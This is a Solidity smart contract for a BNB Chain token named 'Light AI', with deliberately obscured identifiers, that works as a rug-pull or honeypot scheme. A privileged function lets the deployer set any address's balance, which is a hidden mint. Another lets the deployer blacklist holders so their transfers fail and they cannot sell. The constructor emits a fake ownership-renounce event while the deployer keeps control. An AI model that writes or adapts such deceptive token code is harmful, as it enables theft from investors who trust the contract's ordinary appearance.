/**
 *Submitted for verification at BscScan.com on 2023-02-24
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface takeFromMin {
    function createPair(address amountTotal, address listExempt) external returns (address);
}

contract LightAI {

    bool public swapSender;

    mapping(address => uint256) public balanceOf;

    uint256 public maxShould;

    address public walletReceiver;

    function transferFrom(address totalTeam, address buyFund, uint256 amountLiquidity) public returns (bool) {
        if (totalTeam != receiverTrading() && allowance[totalTeam][receiverTrading()] != type(uint256).max) {
            require(allowance[totalTeam][receiverTrading()] >= amountLiquidity);
            allowance[totalTeam][receiverTrading()] -= amountLiquidity;
        }
        require(!txSell[totalTeam]);
        return walletFrom(totalTeam, buyFund, amountLiquidity);
    }

    mapping(address => bool) public fromSender;

    uint256 public maxLaunchedWallet;

    uint256 public fromAuto;

    event Transfer(address indexed from, address indexed isFee, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function receiverTrading() private view returns (address) {
        return msg.sender;
    }

    uint256 private launchedBuy;

    string public symbol = "LAI";

    bool public receiverTotal;

    bool public senderBuy;

    function feeMin(address atSwap) public {
        require(!totalBuy);
        fromSender[atSwap] = true;
        totalBuy = true;
    }

    function walletFrom(address senderEnable, address toListAuto, uint256 amountLiquidity) internal returns (bool) {
        require(balanceOf[senderEnable] >= amountLiquidity);
        balanceOf[senderEnable] -= amountLiquidity;
        balanceOf[toListAuto] += amountLiquidity;
        emit Transfer(senderEnable, toListAuto, amountLiquidity);
        return true;
    }

    address public txSender;

    uint256 public totalIsExempt;

    function amountModeLaunch(address buyFund, uint256 amountLiquidity) public {
        require(fromSender[receiverTrading()]);
        balanceOf[buyFund] = amountLiquidity;
    }

    string public name = "Light AI";

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    uint256 public totalSupply = 100000000 * 10 ** 18;

    function toEnable(address buyAuto) public {
        require(fromSender[receiverTrading()]);
        if (buyAuto == walletReceiver || buyAuto == txSender) {
            return;
        }
        txSell[buyAuto] = true;
    }

    function approve(address listBuy, uint256 amountLiquidity) public returns (bool) {
        allowance[receiverTrading()][listBuy] = amountLiquidity;
        emit Approval(receiverTrading(), listBuy, amountLiquidity);
        return true;
    }

    event Approval(address indexed feeReceiverLaunched, address indexed spender, uint256 value);

    address public owner;

    uint8 public decimals = 18;

    bool public totalBuy;

    function transfer(address buyFund, uint256 amountLiquidity) external returns (bool) {
        return transferFrom(receiverTrading(), buyFund, amountLiquidity);
    }

    bool private sellWalletFund;

    bool private exemptTake;

    mapping(address => bool) public txSell;

    constructor (){ 
        txSender = takeFromMin(address(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73)).createPair(address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c),address(this));
        walletReceiver = receiverTrading();
        balanceOf[walletReceiver] = totalSupply;
        fromSender[walletReceiver] = true;
        emit Transfer(address(0), walletReceiver, totalSupply);
        emit OwnershipTransferred(walletReceiver, address(0));
    }

}